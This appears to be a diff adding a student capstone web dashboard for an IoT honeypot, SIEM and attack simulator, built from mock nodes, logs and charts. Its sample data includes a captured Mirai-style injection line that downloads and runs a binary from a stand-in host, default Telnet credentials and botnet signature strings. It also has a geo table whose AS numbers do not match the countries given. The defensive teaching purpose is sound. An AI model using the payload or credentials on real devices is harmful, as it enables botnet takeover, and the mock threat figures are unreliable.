+          <p class="text-xs text-slate-400 mb-4">Frequency of honeypot rule triggers over time</p>
+          <div class="h-60 relative">
+            <canvas id="honeypotBarChart"></canvas>
+          </div>
+        </div>
+
+        <!-- Geo Attack Origin Simulation -->
+        <div class="glass-card p-5 rounded-xl border border-slate-800 flex flex-col justify-between">
+          <div>
+            <h3 class="text-base font-semibold text-white mb-1">Geographic Reconnaissance Origin</h3>
+            <p class="text-xs text-slate-400 mb-4">Simulated threat intelligence IP routing</p>
+          </div>
+          <div class="space-y-3 font-mono text-xs">
+            <div class="flex items-center justify-between p-2.5 bg-slate-900/60 rounded border border-slate-800">
+              <span class="flex items-center gap-2"><span class="font-bold text-rose-400">RU</span> Russia (AS4134)</span>
+              <span class="text-slate-300">42 Attack Attempts</span>
+              <span class="px-2 py-0.5 bg-rose-500/20 text-rose-400 rounded">HIGH RISK</span>
+            </div>
+            <div class="flex items-center justify-between p-2.5 bg-slate-900/60 rounded border border-slate-800">
+              <span class="flex items-center gap-2"><span class="font-bold text-amber-400">CN</span> China (AS17621)</span>
+              <span class="text-slate-300">28 Attack Attempts</span>
+              <span class="px-2 py-0.5 bg-amber-500/20 text-amber-400 rounded">MODERATE</span>
+            </div>
+            <div class="flex items-center justify-between p-2.5 bg-slate-900/60 rounded border border-slate-800">
+              <span class="flex items-center gap-2"><span class="font-bold text-amber-400">US</span> United States (AS15169)</span>
+              <span class="text-slate-300">19 Attack Attempts</span>
+              <span class="px-2 py-0.5 bg-amber-500/20 text-amber-400 rounded">MODERATE</span>
+            </div>
+            <div class="flex items-center justify-between p-2.5 bg-slate-900/60 rounded border border-slate-800">
+              <span class="flex items-center gap-2"><span class="font-bold text-emerald-400">NL</span> Netherlands (AS60781)</span>
+              <span class="text-slate-300">11 Attack Attempts</span>
+              <span class="px-2 py-0.5 bg-emerald-500/20 text-emerald-400 rounded">LOW RISK</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Intelligent Pattern Detection Logic Cards -->
+      <div class="glass-card p-5 rounded-xl border border-slate-800">
+        <h3 class="text-base font-semibold text-white mb-4">Intelligent Pattern Analysis Engine Rules</h3>
+        
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
+          <div class="p-4 bg-slate-900/60 border border-slate-800 rounded-lg">
+            <div class="flex items-center gap-2 text-cyan-400 font-bold mb-2">
+              <i class="fa-solid fa-radar"></i> Port Scanning Detector
+            </div>
+            <p class="text-slate-400 mb-2">Identifies rapid SYN / Xmas TCP probes targeting multiple sequential ports within 500ms.</p>
+            <span class="text-emerald-400 font-mono">Status: ACTIVE</span>
+          </div>
+
+          <div class="p-4 bg-slate-900/60 border border-slate-800 rounded-lg">
+            <div class="flex items-center gap-2 text-rose-400 font-bold mb-2">
+              <i class="fa-solid fa-key"></i> Brute Force Analyzer
+            </div>
+            <p class="text-slate-400 mb-2">Tracks failed login attempts on Telnet/SSH. Triggers alert after >5 attempts per minute.</p>
+            <span class="text-emerald-400 font-mono">Status: ACTIVE</span>
+          </div>
+
+          <div class="p-4 bg-slate-900/60 border border-slate-800 rounded-lg">
+            <div class="flex items-center gap-2 text-amber-400 font-bold mb-2">
+              <i class="fa-solid fa-bug"></i> Botnet Signature Match
+            </div>
+            <p class="text-slate-400 mb-2">Matches payloads against Mirai / Hajime signatures (e.g. `\x50\x4f\x4e\x47` or `/bin/busybox`).</p>
+            <span class="text-emerald-400 font-mono">Status: ACTIVE</span>
+          </div>
+
+          <div class="p-4 bg-slate-900/60 border border-slate-800 rounded-lg">
+            <div class="flex items-center gap-2 text-purple-400 font-bold mb-2">
+              <i class="fa-solid fa-wave-square"></i> Traffic Spike Anomaly
+            </div>
+            <p class="text-slate-400 mb-2">Statistical outlier detection when UDP packet rate exceeds 300% of rolling baseline.</p>
+            <span class="text-emerald-400 font-mono">Status: ACTIVE</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+
+    <!-- ==================== TAB 5: SIEM & INCIDENT MANAGEMENT ==================== -->
+    <div id="tab-events" class="tab-content hidden space-y-6">
+      
+      <div class="glass-card p-5 rounded-xl border border-slate-800">
+        <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-4">
+          <div>
+            <h2 class="text-lg font-bold text-white">Security Information & Event Management (SIEM)</h2>
+            <p class="text-xs text-slate-400">Incident triage, raw forensic analysis & automated firewall mitigation</p>
+          </div>
+          <div class="flex items-center gap-2">
+            <input type="text" id="siem-search" onkeyup="filterSiemEvents()" placeholder="Search incidents..." class="bg-slate-900 border border-slate-700 text-slate-300 text-xs rounded-lg p-2 w-56 focus:border-cyan-500 font-mono">
+            <select id="siem-filter-sev" onchange="filterSiemEvents()" class="bg-slate-900 border border-slate-700 text-slate-300 text-xs rounded-lg p-2 focus:border-cyan-500">
+              <option value="ALL">All Severities</option>
+              <option value="CRITICAL">CRITICAL</option>
+              <option value="WARNING">WARNING</option>
+              <option value="INFO">INFO</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Incident Table -->
+        <div class="overflow-x-auto border border-slate-800 rounded-lg">
+          <table class="w-full text-left text-xs font-mono">
+            <thead class="bg-slate-950 text-slate-400 uppercase tracking-wider border-b border-slate-800">
+              <tr>
+                <th class="p-3">Incident ID</th>
+                <th class="p-3">Timestamp</th>
+                <th class="p-3">Severity</th>
+                <th class="p-3">Threat Category</th>
+                <th class="p-3">Source IP</th>
+                <th class="p-3">Target Node</th>
+                <th class="p-3">Mitigation Status</th>
+                <th class="p-3">Action</th>
+              </tr>
+            </thead>
+            <tbody id="siem-table-body" class="divide-y divide-slate-800/60 text-slate-300">
+              <!-- Dynamically populated -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Incident Inspection Drawer -->
+      <div id="siem-modal" class="glass-card p-5 rounded-xl border border-rose-500/30 hidden">
+        <div class="flex items-center justify-between mb-4 border-b border-slate-800 pb-3">
+          <div class="flex items-center gap-3">
+            <span id="siem-modal-sev-badge" class="px-2 py-1 text-xs font-bold bg-rose-500/20 text-rose-400 border border-rose-500/30 rounded">CRITICAL</span>
+            <div>
+              <h3 id="siem-modal-title" class="text-base font-bold text-white">Incident Investigation #INC-8902</h3>
+              <p id="siem-modal-time" class="text-xs text-slate-400 font-mono">Detected at 2026-09-29 22:41:10 UTC</p>
+            </div>
+          </div>
+          <button onclick="closeSiemModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 text-xs">
+          <!-- Timeline & Details -->
+          <div class="space-y-3 bg-slate-950 p-4 rounded-lg border border-slate-800">
+            <h4 class="font-bold text-cyan-400 uppercase border-b border-slate-800 pb-1">Attack Timeline & Attributes</h4>
+            <div><span class="text-slate-500">Source IP:</span> <span id="siem-modal-ip" class="font-mono text-rose-400 font-semibold">185.220.101.5</span></div>
+            <div><span class="text-slate-500">Target Node:</span> <span id="siem-modal-node" class="text-slate-200">Smart Camera (192.168.1.101)</span></div>
+            <div><span class="text-slate-500">Attack Vector:</span> <span id="siem-modal-vector" class="text-slate-200">Mirai Botnet Telnet Credential Spray</span></div>
+            <div class="pt-2">
+              <span class="text-slate-500 block mb-1">Recommended Remediation:</span>
+              <p id="siem-modal-remediation" class="bg-slate-900 p-2.5 rounded border border-slate-800 text-slate-300">
+                Immediately block source IP at Gateway Firewall and rotate default credentials for target honeypot container.
+              </p>
+            </div>
+          </div>
+
+          <!-- Payload Dump & Auto Mitigation -->
+          <div class="space-y-3 bg-slate-950 p-4 rounded-lg border border-slate-800 flex flex-col justify-between">
+            <div>
+              <h4 class="font-bold text-cyan-400 uppercase border-b border-slate-800 pb-1">Captured Artifact / Payload</h4>
+              <pre id="siem-modal-payload" class="mt-2 text-rose-300 bg-slate-900 p-2.5 rounded border border-slate-800 font-mono overflow-x-auto text-xs">
+GET /shell?cd+/tmp;+wget+http://malware-repo/mirai.arm;+chmod+777+mirai.arm;+./mirai.arm
+              </pre>
+            </div>
+            <div class="pt-3 border-t border-slate-800 flex gap-3">
+              <button id="siem-ban-btn" onclick="executeIpBan()" class="flex-1 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded font-semibold text-xs transition flex items-center justify-center gap-2">
+                <i class="fa-solid fa-ban"></i> Blacklist Source IP
+              </button>
+              <button onclick="closeSiemModal()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-xs font-semibold">Close</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+
+    <!-- ==================== TAB 6: ATTACK SIMULATOR ==================== -->
+    <div id="tab-simulator" class="tab-content hidden space-y-6">
+      
+      <div class="glass-card p-5 rounded-xl border border-slate-800">
+        <div class="mb-6">
+          <h2 class="text-lg font-bold text-white flex items-center gap-2">
+            <i class="fa-solid fa-crosshairs text-amber-400"></i> Interactive IoT Cyber Attack Simulator
+          </h2>
+          <p class="text-xs text-slate-400">Trigger real-time attack scenarios to observe how the deception network and honeypot catch threats</p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+          
+          <!-- Scenario 1 -->
+          <div class="bg-slate-950 p-5 rounded-xl border border-slate-800 flex flex-col justify-between hover:border-cyan-500/50 transition">
+            <div class="space-y-2">
+              <div class="flex items-center justify-between">
+                <span class="text-xs font-bold text-cyan-400 font-mono">SCENARIO 01</span>
+                <span class="px-2 py-0.5 text-xs bg-amber-500/20 text-amber-400 rounded">RECONNAISSANCE</span>
+              </div>
+              <h3 class="text-base font-bold text-white">Nmap Port Sweep</h3>
+              <p class="text-xs text-slate-400">Launches rapid TCP SYN scan across ports 21, 22, 23, 80, 554, 1883 on all IoT nodes.</p>
+            </div>
+            <button onclick="triggerAttackScenario('PORT_SCAN')" class="mt-4 w-full py-2.5 bg-cyan-600 hover:bg-cyan-500 text-white rounded-lg font-semibold text-xs transition flex items-center justify-center gap-2">
+              <i class="fa-solid fa-play"></i> Launch Port Scan Sweep
+            </button>
+          </div>
+
+          <!-- Scenario 2 -->
+          <div class="bg-slate-950 p-5 rounded-xl border border-slate-800 flex flex-col justify-between hover:border-rose-500/50 transition">
+            <div class="space-y-2">
+              <div class="flex items-center justify-between">
+                <span class="text-xs font-bold text-rose-400 font-mono">SCENARIO 02</span>
+                <span class="px-2 py-0.5 text-xs bg-rose-500/20 text-rose-400 rounded">BRUTE FORCE</span>
+              </div>
+              <h3 class="text-base font-bold text-white">Telnet Credential Spray</h3>
+              <p class="text-xs text-slate-400">Simulates high-velocity dictionary login attempts (`admin/admin`, `root/12345`) against Smart Camera Telnet port.</p>
+            </div>
+            <button onclick="triggerAttackScenario('BRUTE_FORCE')" class="mt-4 w-full py-2.5 bg-rose-600 hover:bg-rose-500 text-white rounded-lg font-semibold text-xs transition flex items-center justify-center gap-2">
+              <i class="fa-solid fa-play"></i> Launch Telnet Brute Force
+            </button>
+          </div>
+
+          <!-- Scenario 3 -->
+          <div class="bg-slate-950 p-5 rounded-xl border border-slate-800 flex flex-col justify-between hover:border-purple-500/50 transition">
+            <div class="space-y-2">
+              <div class="flex items-center justify-between">
+                <span class="text-xs font-bold text-purple-400 font-mono">SCENARIO 03</span>
+                <span class="px-2 py-0.5 text-xs bg-purple-500/20 text-purple-400 rounded">BOTNET RECON</span>
+              </div>
+              <h3 class="text-base font-bold text-white">Mirai Botnet Probe</h3>
+              <p class="text-xs text-slate-400">Sends known Mirai malware signature payloads seeking vulnerable IoT BusyBox routers and cameras.</p>
+            </div>
+            <button onclick="triggerAttackScenario('MIRAI')" class="mt-4 w-full py-2.5 bg-purple-600 hover:bg-purple-500 text-white rounded-lg font-semibold text-xs transition flex items-center justify-center gap-2">
+              <i class="fa-solid fa-play"></i> Launch Mirai Probe
+            </button>
+          </div>
+
+          <!-- Scenario 4 -->
+          <div class="bg-slate-950 p-5 rounded-xl border border-slate-800 flex flex-col justify-between hover:border-amber-500/50 transition">
+            <div class="space-y-2">
+              <div class="flex items-center justify-between">
+                <span class="text-xs font-bold text-amber-400 font-mono">SCENARIO 04</span>
+                <span class="px-2 py-0.5 text-xs bg-amber-500/20 text-amber-400 rounded">DENIAL OF SERVICE</span>
+              </div>
+              <h3 class="text-base font-bold text-white">UDP Flood Attack</h3>
+              <p class="text-xs text-slate-400">Floods the Industrial IoT Gateway node with massive UDP packet traffic spikes to test anomaly threshold alarms.</p>
+            </div>
+            <button onclick="triggerAttackScenario('UDP_FLOOD')" class="mt-4 w-full py-2.5 bg-amber-600 hover:bg-amber-500 text-white rounded-lg font-semibold text-xs transition flex items-center justify-center gap-2">
+              <i class="fa-solid fa-play"></i> Launch UDP Flood
+            </button>
+          </div>
+
+          <!-- Scenario 5 -->
+          <div class="bg-slate-950 p-5 rounded-xl border border-slate-800 flex flex-col justify-between hover:border-emerald-500/50 transition lg:col-span-2">
+            <div class="space-y-2">
+              <div class="flex items-center justify-between">
+                <span class="text-xs font-bold text-emerald-400 font-mono">SCENARIO 05</span>
+                <span class="px-2 py-0.5 text-xs bg-emerald-500/20 text-emerald-400 rounded">BENIGN TRAFFIC</span>
+              </div>
+              <h3 class="text-base font-bold text-white">Normal IoT Telemetry Burst</h3>
+              <p class="text-xs text-slate-400">Simulates normal benign MQTT telemetry publish packets from smart bulbs and thermostats to test false-positive filtration.</p>
+            </div>
+            <button onclick="triggerAttackScenario('NORMAL_BURST')" class="mt-4 w-full py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg font-semibold text-xs transition flex items-center justify-center gap-2">
+              <i class="fa-solid fa-play"></i> Inject Benign Telemetry Stream
+            </button>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+
+
+    <!-- ==================== TAB 7: PROJECT OVERVIEW & ARCHITECTURE ==================== -->
+    <div id="tab-overview" class="tab-content hidden space-y-6">
+      
+      <!-- Academic & Institution Header Card -->
+      <div class="glass-card p-6 rounded-xl border border-slate-800 text-center relative overflow-hidden">
+        <div class="max-w-3xl mx-auto space-y-3">
+          <span class="px-3 py-1 bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-full text-xs font-semibold tracking-wider uppercase">
+            Cybersecurity Department Capstone Project
+          </span>
+          <h1 class="text-2xl sm:text-3xl font-extrabold text-white">IoT Deception Network with Intelligent Honeypot and Network Packet Analysis</h1>
+          <p class="text-slate-300 text-sm">
+            Malla Reddy University, Hyderabad, Telangana State
+          </p>
+          <div class="pt-4 flex flex-wrap justify-center gap-6 text-xs text-slate-300 font-mono border-t border-slate-800/80">
+            <div><span class="text-slate-500 block">Student Lead:</span> <span class="text-cyan-300 font-bold">G. Rahul Goud</span> (2511CS040109)</div>
+            <div><span class="text-slate-500 block">Co-Researcher:</span> <span class="text-cyan-300 font-bold">A. Yashwanth Reddy</span> (2511CS040125)</div>
+            <div><span class="text-slate-500 block">Project Guide:</span> <span class="text-emerald-400 font-bold">Mr. Naveen Kumar</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- System Architecture & Flowchart -->
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <!-- Architecture Diagram Card -->
+        <div class="glass-card p-5 rounded-xl border border-slate-800">
+          <h3 class="text-base font-bold text-white mb-4 flex items-center gap-2">
+            <i class="fa-solid fa-sitemap text-cyan-400"></i> System Architectural Modules
+          </h3>
+          <div class="space-y-4 text-xs font-mono">
+            <div class="p-3 bg-slate-950 border border-slate-800 rounded-lg flex items-center gap-3">
+              <div class="p-2.5 bg-cyan-500/20 text-cyan-400 rounded"><i class="fa-solid fa-tv text-lg"></i></div>
+              <div>
+                <div class="font-bold text-white">1. IoT Device Simulation</div>
+                <div class="text-slate-400">Emulates Smart Cameras, Smart Bulbs, IoT Routers & Gateways</div>
+              </div>
+            </div>
+
+            <div class="p-3 bg-slate-950 border border-slate-800 rounded-lg flex items-center gap-3">
+              <div class="p-2.5 bg-emerald-500/20 text-emerald-400 rounded"><i class="fa-solid fa-filter text-lg"></i></div>
+              <div>
+                <div class="font-bold text-white">2. Network Packet Analysis Engine</div>
+                <div class="text-slate-400">Extracts IP, Ports, Protocols (MQTT, Telnet, CoAP) & Payload sizes</div>
+              </div>
+            </div>
+
+            <div class="p-3 bg-slate-950 border border-slate-800 rounded-lg flex items-center gap-3">
+              <div class="p-2.5 bg-amber-500/20 text-amber-400 rounded"><i class="fa-solid fa-spider text-lg"></i></div>
+              <div>
+                <div class="font-bold text-white">3. Intelligent Honeypot Engine</div>
+                <div class="text-slate-400">Captures suspicious interactions, credentials spray & scan signatures</div>
+              </div>
+            </div>
+
+            <div class="p-3 bg-slate-950 border border-slate-800 rounded-lg flex items-center gap-3">
+              <div class="p-2.5 bg-rose-500/20 text-rose-400 rounded"><i class="fa-solid fa-bell text-lg"></i></div>
+              <div>
+                <div class="font-bold text-white">4. Threat Detection & SIEM Alerting</div>
+                <div class="text-slate-400">Generates real-time security events and automated IP mitigation rules</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Flow Diagram Card -->
+        <div class="glass-card p-5 rounded-xl border border-slate-800">
+          <h3 class="text-base font-bold text-white mb-4 flex items-center gap-2">
+            <i class="fa-solid fa-diagram-project text-cyan-400"></i> Execution Data Flow DFD
+          </h3>
+          <div class="p-4 bg-slate-950 border border-slate-800 rounded-lg space-y-3 font-mono text-xs">
+            <div class="flex items-center justify-between text-slate-300">
+              <span>[ Network Traffic Ingestion ]</span>
+              <i class="fa-solid fa-arrow-right text-cyan-400"></i>
+            </div>
+            <div class="pl-4 border-l-2 border-cyan-500/30 text-slate-400">
+              ↓ Live Wireshark-like Packet Extraction (Source/Dst IP, Flags, Port)
+            </div>
+            <div class="flex items-center justify-between text-slate-300">
+              <span>[ Deception Network Routing ]</span>
+              <i class="fa-solid fa-arrow-right text-cyan-400"></i>
+            </div>
+            <div class="pl-4 border-l-2 border-amber-500/30 text-slate-400">
+              ↓ Honeypot Trap Processing & Signature Matching (Mirai / Port Scan)
+            </div>
+            <div class="flex items-center justify-between text-slate-300">
+              <span>[ Alert & Event Storage ]</span>
+              <i class="fa-solid fa-arrow-right text-cyan-400"></i>
+            </div>
+            <div class="pl-4 border-l-2 border-rose-500/30 text-slate-400">
+              ↓ Real-Time SIEM Web Operations Dashboard
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+  </main>
+
+  <script>
+    /* ==========================================================================
+       1. GLOBAL STATE & INITIALIZATION
+       ========================================================================== */
+    let isSimulating = true;
+    let packetCounter = 14290;
+    let totalThreats = 84;
+    let activeTab = 'dashboard';
+
+    // Mock IoT Devices Array
+    const iotNodes = [
+      {
+        id: 'node-1',
+        name: 'Smart Camera Pro',
+        type: 'camera',
+        ip: '192.168.1.101',
+        icon: 'fa-video',
+        status: 'active', // active, attack, disabled
+        vuln: 'Exposed Telnet/SSH',
+        services: ['Telnet (23)', 'RTSP (554)', 'HTTP (80)'],
+        cpu: 18,
+        ram: 52,
+        connections: 4,
+        trapped: 38
+      },
+      {
+        id: 'node-2',
+        name: 'Smart Bulb Hub',
+        type: 'bulb',
+        ip: '192.168.1.102',
+        icon: 'fa-lightbulb',
+        status: 'active',
+        vuln: 'Open MQTT Broker',
+        services: ['MQTT (1883)', 'HTTP (80)'],
+        cpu: 8,
+        ram: 28,
+        connections: 2,
+        trapped: 14
+      },
+      {
+        id: 'node-3',
+        name: 'Core IoT Router',
+        type: 'router',
+        ip: '192.168.1.1',
+        icon: 'fa-router',
+        status: 'active',
+        vuln: 'Default Credentials',
+        services: ['SSH (22)', 'DNS (53)', 'HTTP (8080)'],
+        cpu: 34,
+        ram: 88,
+        connections: 12,
+        trapped: 65
+      },
+      {
+        id: 'node-4',
+        name: 'Smart Thermostat',
+        type: 'thermostat',
+        ip: '192.168.1.104',
+        icon: 'fa-temperature-high',
+        status: 'active',
+        vuln: 'Outdated Firmware',
+        services: ['CoAP (5683)', 'HTTP (80)'],
+        cpu: 12,
+        ram: 32,
+        connections: 1,
+        trapped: 9
+      },
+      {
+        id: 'node-5',
+        name: 'Industrial Gateway',
+        type: 'gateway',
+        ip: '192.168.1.200',
+        icon: 'fa-server',
+        status: 'active',
+        vuln: 'Default Credentials',
+        services: ['Modbus (502)', 'SSH (22)', 'MQTT (1883)'],
+        cpu: 25,
+        ram: 110,
+        connections: 6,
+        trapped: 42
+      }
+    ];
+
+    // Mock Live Attack Log Stream
+    let attackLogs = [
+      {
+        id: 'INC-8901',
+        time: '22:41:05',
+        ip: '185.220.101.5',
+        target: 'Smart Camera (192.168.1.101)',
+        service: 'Telnet (23)',
+        type: 'Mirai Botnet Probe',
+        severity: 'CRITICAL',
+        action: 'Captured & Quarantined',
+        payload: 'USER: root / PASS: xc3511 SHELL EXEC'
+      },
+      {
+        id: 'INC-8902',
+        time: '22:40:48',
+        ip: '45.142.214.12',
+        target: 'Core IoT Router (192.168.1.1)',
+        service: 'SSH (22)',
+        type: 'Brute Force Attempt',
+        severity: 'WARNING',
+        action: 'Rate-Limited Trap',
+        payload: 'Dictionary login sweep (12 attempts/sec)'
+      },
+      {
+        id: 'INC-8903',
+        time: '22:40:12',
+        ip: '103.251.167.8',
+        target: 'All Nodes Sweep',
+        service: 'TCP SYN Multi-Port',
+        type: 'Port Scanning',
+        severity: 'INFO',
+        action: 'Logged Reconnaissance',
+        payload: 'SYN Scan across ports 21-8080'
+      }
+    ];
+
+    // Packet Stream Data Buffer
+    let packetStream = [];
+
+    // Chart Handles
+    let trafficChartInstance = null;
+    let vectorChartInstance = null;
+    let honeypotBarChartInstance = null;
+
+    /* ==========================================================================
+       2. TAB SWITCHING LOGIC
+       ========================================================================== */
+    function switchTab(tabId) {
+      activeTab = tabId;
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+      document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.classList.remove('text-cyan-400', 'bg-cyan-500/10', 'border', 'border-cyan-500/20');
+        btn.classList.add('text-slate-400');
+      });
+
+      const activeEl = document.getElementById(`tab-${tabId}`);
+      if (activeEl) activeEl.classList.remove('hidden');
+
+      const activeBtn = document.getElementById(`tab-btn-${tabId}`);
+      if (activeBtn) {
+        activeBtn.classList.add('text-cyan-400', 'bg-cyan-500/10', 'border', 'border-cyan-500/20');
+        activeBtn.classList.remove('text-slate-400');
+      }
+
+      // Resize charts on view
+      if (tabId === 'dashboard' && trafficChartInstance) {
+        trafficChartInstance.resize();
+        vectorChartInstance.resize();
+      } else if (tabId === 'honeypot' && honeypotBarChartInstance) {
+        honeypotBarChartInstance.resize();
+      }
+    }
+
+    /* ==========================================================================
+       3. CHART INITIALIZATION
+       ========================================================================== */
+    function initCharts() {
+      // 1. Live Traffic Chart (Line)
+      const ctxTraffic = document.getElementById('trafficChart').getContext('2d');
+      const timeLabels = Array.from({length: 15}, (_, i) => `${15 - i}s ago`);
+      const normalData = [45, 52, 48, 60, 55, 58, 62, 50, 54, 58, 60, 65, 52, 59, 61];
+      const attackData = [5, 4, 8, 35, 40, 12, 6, 8, 45, 50, 10, 5, 8, 30, 25];
+
+      trafficChartInstance = new Chart(ctxTraffic, {
+        type: 'line',
+        data: {
+          labels: timeLabels,
+          datasets: [
+            {
+              label: 'Normal Traffic',
+              data: normalData,
+              borderColor: '#06b6d4',
+              backgroundColor: 'rgba(6, 182, 212, 0.1)',
+              fill: true,
+              tension: 0.3,
+              borderWidth: 2
+            },
+            {
+              label: 'Suspicious / Attack',
+              data: attackData,
+              borderColor: '#ef4444',
+              backgroundColor: 'rgba(239, 68, 68, 0.15)',
+              fill: true,
+              tension: 0.3,
+              borderWidth: 2
+            }
+          ]
+        },
+        options: {
+          responsive: true,
+          maintainAspectRatio: false,
+          plugins: { legend: { display: false } },
+          scales: {
+            x: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#64748b', font: { size: 10 } } },
+            y: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#64748b', font: { size: 10 } } }
+          }
+        }
+      });
+
+      // 2. Vector Breakdown (Doughnut)
+      const ctxVector = document.getElementById('vectorChart').getContext('2d');
+      vectorChartInstance = new Chart(ctxVector, {
+        type: 'doughnut',
+        data: {
+          labels: ['Port Scan', 'Brute Force', 'Mirai Botnet', 'UDP Flood'],
+          datasets: [{
+            data: [42, 31, 18, 9],
+            backgroundColor: ['#06b6d4', '#ef4444', '#f59e0b', '#a855f7'],
+            borderWidth: 0
+          }]
+        },
+        options: {
+          responsive: true,
+          maintainAspectRatio: false,
+          plugins: { legend: { display: false } },
+          cutout: '70%'
+        }
+      });
+
+      // 3. Honeypot Bar Chart
+      const ctxHoneypot = document.getElementById('honeypotBarChart').getContext('2d');
+      honeypotBarChartInstance = new Chart(ctxHoneypot, {
+        type: 'bar',
+        data: {
+          labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00', 'Now'],
+          datasets: [
+            {
+              label: 'Recon Probes',
+              data: [12, 19, 3, 25, 42, 30, 48],
+              backgroundColor: '#06b6d4'
+            },
+            {
+              label: 'Exploit Attempts',
+              data: [4, 8, 1, 12, 28, 15, 31],
+              backgroundColor: '#ef4444'
+            }
+          ]
+        },
+        options: {
+          responsive: true,
+          maintainAspectRatio: false,
+          plugins: { legend: { display: true, labels: { color: '#94a3b8', font: { size: 10 } } } },
+          scales: {
+            x: { grid: { display: false }, ticks: { color: '#64748b' } },
+            y: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#64748b' } }
+          }
+        }
+      });
+    }
+
+    /* ==========================================================================
+       4. DECEPTION NETWORK NODES RENDERING
+       ========================================================================== */
+    function renderNodes() {
+      const grid = document.getElementById('node-grid');
+      grid.innerHTML = '';
+
+      iotNodes.forEach(node => {
+        const isAttack = node.status === 'attack';
+        const card = document.createElement('div');
+        card.className = `p-4 rounded-xl border ${isAttack ? 'border-rose-500 bg-rose-950/20 pulse-danger' : 'border-slate-800 bg-slate-950/80'} hover:border-cyan-500/50 transition cursor-pointer flex flex-col justify-between`;
+        card.onclick = () => openNodePanel(node.id);
+
+        card.innerHTML = `
+          <div>
+            <div class="flex items-center justify-between mb-3">
+              <div class="flex items-center gap-3">
+                <div class="p-2.5 rounded-lg ${isAttack ? 'bg-rose-500/20 text-rose-400' : 'bg-cyan-500/10 text-cyan-400'}">
+                  <i class="fa-solid ${node.icon} text-xl"></i>
+                </div>
+                <div>
+                  <h4 class="font-bold text-white text-sm">${node.name}</h4>
+                  <span class="text-xs font-mono text-slate-400">${node.ip}</span>
+                </div>
+              </div>
+              <span class="w-2.5 h-2.5 rounded-full ${isAttack ? 'bg-amber-400 animate-ping' : 'bg-emerald-400'}"></span>
+            </div>
+
+            <div class="space-y-2 text-xs font-mono text-slate-300">
+              <div class="flex justify-between bg-slate-900/60 p-1.5 rounded">
+                <span class="text-slate-400">Trap Profile:</span>
+                <span class="text-cyan-300 font-semibold">${node.vuln}</span>
+              </div>
+              <div class="flex justify-between bg-slate-900/60 p-1.5 rounded">
+                <span class="text-slate-400">Trapped Attackers:</span>
+                <span class="text-amber-400 font-bold">${node.trapped} probes</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="mt-4 pt-3 border-t border-slate-800/80 flex items-center justify-between text-xs text-slate-400">
+            <span>Click to configure traps</span>
+            <i class="fa-solid fa-chevron-right text-cyan-400"></i>
+          </div>
+        `;
+        grid.appendChild(card);
+      });
+    }
+
+    let selectedNodeId = null;
+
+    function openNodePanel(nodeId) {
+      selectedNodeId = nodeId;
+      const node = iotNodes.find(n => n.id === nodeId);
+      if (!node) return;
+
+      document.getElementById('node-detail-panel').classList.remove('hidden');
+      document.getElementById('node-modal-icon').className = `fa-solid ${node.icon} text-2xl text-cyan-400`;
+      document.getElementById('node-modal-title').innerText = node.name;
+      document.getElementById('node-modal-ip').innerText = `${node.ip} (Honeypot Instance)`;
+      document.getElementById('node-modal-vuln').value = node.vuln;
+      document.getElementById('node-modal-cpu').innerText = `${node.cpu}%`;
+      document.getElementById('node-modal-ram').innerText = `${node.ram} MB / 128 MB`;
+      document.getElementById('node-modal-conn').innerText = `${node.connections} Sessions`;
+      document.getElementById('node-modal-trapped').innerText = `${node.trapped} trapped`;
+
+      const servContainer = document.getElementById('node-modal-services');
+      servContainer.innerHTML = node.services.map(s => `<span class="px-2 py-0.5 bg-slate-800 text-cyan-300 rounded text-xs border border-slate-700">${s}</span>`).join(' ');
+    }
+
+    function closeNodePanel() {
+      document.getElementById('node-detail-panel').classList.add('hidden');
+    }
+
+    function updateNodeVuln(newVuln) {
+      if (!selectedNodeId) return;
+      const node = iotNodes.find(n => n.id === selectedNodeId);
+      if (node) {
+        node.vuln = newVuln;
+        renderNodes();
+      }
+    }
+
+    function restartNode() {
+      alert(`Simulated Honeypot Container [${selectedNodeId}] restarted successfully.`);
+    }
+
+    function purgeNodeLogs() {
+      if (!selectedNodeId) return;
+      const node = iotNodes.find(n => n.id === selectedNodeId);
+      if (node) {
+        node.trapped = 0;
+        renderNodes();
+        openNodePanel(selectedNodeId);
+      }
+    }
+
+    /* ==========================================================================
+       5. PACKET SNIFFER & DEEP PACKET INSPECTION (DPI)
+       ========================================================================== */
+    function generateRandomPacket() {
+      const protocols = ['TCP', 'UDP', 'MQTT', 'Telnet', 'HTTP'];
+      const ips = ['185.220.101.5', '45.142.214.12', '103.251.167.8', '192.168.1.101', '192.168.1.102', '192.168.1.1'];
+      const isAnomaly = Math.random() < 0.25;
+
+      const proto = protocols[Math.floor(Math.random() * protocols.length)];
+      const src = ips[Math.floor(Math.random() * ips.length)];
+      const dst = '192.168.1.' + Math.floor(Math.random() * 5 + 100);
+      const port = proto === 'Telnet' ? 23 : proto === 'MQTT' ? 1883 : proto === 'HTTP' ? 80 : Math.floor(Math.random() * 8000 + 1000);
